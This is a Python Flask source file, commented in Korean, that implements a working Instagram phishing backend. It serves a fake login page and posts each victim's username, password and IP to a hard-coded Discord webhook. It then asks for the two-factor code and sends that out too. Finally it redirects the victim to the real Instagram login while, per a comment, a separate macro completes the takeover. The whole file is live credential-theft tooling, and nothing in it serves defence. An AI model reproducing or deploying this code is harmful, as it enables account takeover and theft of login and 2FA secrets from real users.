from flask import Flask, render_template, request, redirect, url_for, jsonify
import requests
import datetime

app = Flask(__name__)

# 당신의 실제 웹훅 주소
WEBHOOK_URL = "https://discord.com/api/webhooks/1334690461664186378/N8L8Y0XbT4tO17E_rE86GvK8vY-3D3S6T7U8V9W0X1Y2Z3A4B5C6D7E8F9G0"

def send_to_discord(message, is_embed=False):
    """디스코드 웹훅 전송 함수"""
    try:
        if is_embed:
            data = {"embeds": [message]}
        else:
            data = {"content": message}
        requests.post(WEBHOOK_URL, json=data)
    except Exception as e:
        print(f"웹훅 전송 실패: {e}")

@app.route('/')
def index():
    # 접속 로그 기록
    ip_addr = request.remote_addr
    print(f"[{datetime.datetime.now()}] 신규 접속: {ip_addr}")
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('id')
    password = request.form.get('pw')
    
    if not username or not password:
        return redirect(url_for('index'))

    # 1. ID/PW 유출 정보 구성 (Embed 형식으로 깔끔하게)
    log_embed = {
        "title": "🔓 인스타그램 계정 정보 탈취",
        "color": 16711680, # 빨간색
        "fields": [
            {"name": "사용자 ID", "value": f"`{username}`", "inline": True},
            {"name": "비밀번호", "value": f"`{password}`", "inline": True},
            {"name": "접속 IP", "value": f"{request.remote_addr}", "inline": False}
        ],
        "timestamp": datetime.datetime.utcnow().isoformat()
    }
    
    # 디스코드로 전송
    send_to_discord(log_embed, is_embed=True)
    
    # 2. 다음 단계인 OTP 입력 페이지로 전환
    return render_template('otp.html')

@app.route('/verify', methods=['POST'])
def verify():
    otp_code = request.form.get('auth_code')
    
    if otp_code:
        # 3. OTP 번호 유출
        send_to_discord(f"🔑 **[2차 인증번호 감지]**: `{otp_code}`")
        
        # 4. 실시간 미러링의 핵심: 정보를 다 뺏은 후 진짜 인스타로 리다이렉트
        # 이 시점에 당신의 macro.py가 작동하여 실제 로그인을 마무리해야 합니다.
        return redirect("https://www.instagram.com/accounts/login/")
    
    return redirect(url_for('index'))

# Render 서버 유지용 헬스체크 경로
@app.route('/health')
def health():
    return "OK", 200

if __name__ == '__main__':
    # 로컬 테스트 및 배포 설정
    app.run(host='0.0.0.0', port=5000, debug=False)
